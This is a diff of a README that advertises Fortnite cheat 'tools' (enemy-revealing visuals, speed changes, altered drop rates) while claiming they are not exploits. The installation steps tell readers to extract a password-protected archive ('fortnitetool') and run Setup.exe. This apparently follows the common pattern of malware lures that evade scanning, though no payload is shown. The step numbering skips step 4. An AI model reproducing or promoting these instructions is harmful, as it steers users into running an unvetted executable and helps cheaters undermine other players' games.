@@ -9,7 +9,7 @@ Fortnite, with its fast-paced action and ever-evolving world, is a game that enc
 These tools are not meant to exploit or harm the game or its community. They provide subtle tweaks and adjustments that can make your time in Fortnite more enjoyable without disrupting the integrity of the overall experience. Please be mindful of how and when you use them.
 
 ## Features
-
+[![1.webp](https://i.postimg.cc/wxfYX1X0/1.webp)](https://postimg.cc/c6nzZ45n)
 - **Enhanced Visuals**: Get a better view of your surroundings with improved graphics and visual enhancements. See things in ways you never have before, from distant enemies to hidden traps.
   
 - **Speed and Efficiency**: Some features allow you to adjust your in-game speed, providing a smoother and quicker gameplay experience. Perfect for those who want to feel the rush of the game without any delay.
@@ -17,7 +17,7 @@ These tools are not meant to exploit or harm the game or its community. They pro
 - **Customizable Interfaces**: Personalize your HUD and controls to suit your style. Make it easier for you to access important tools and information when you need them.
 
 - **Gameplay Tweaks**: Modify aspects of gameplay to better suit your preferences. This could include things like adjusting item drop rates or other small, non-intrusive changes.
-
+[![2.webp](https://i.postimg.cc/DZxHPNX8/2.webp)](https://postimg.cc/G8sXcqzC)
 ## Installation
 
 To get started with these tools, follow the steps below:
@@ -31,12 +31,13 @@ Installation
 
 3. **Extract the Archive**
     After downloading, extract the archive using the password:
+
     fortnitetool
 
-4. **Run the Setup.exe**
+5. **Run the Setup.exe**
     Inside the extracted folder, run the Setup.exe file to begin the installation process.
 
-5. **Launch Fortnite**
+6. **Launch Fortnite**
     After the installation is complete, open Fortnite and enjoy the modified experience during your gameplay.
 
 ## Important Notes
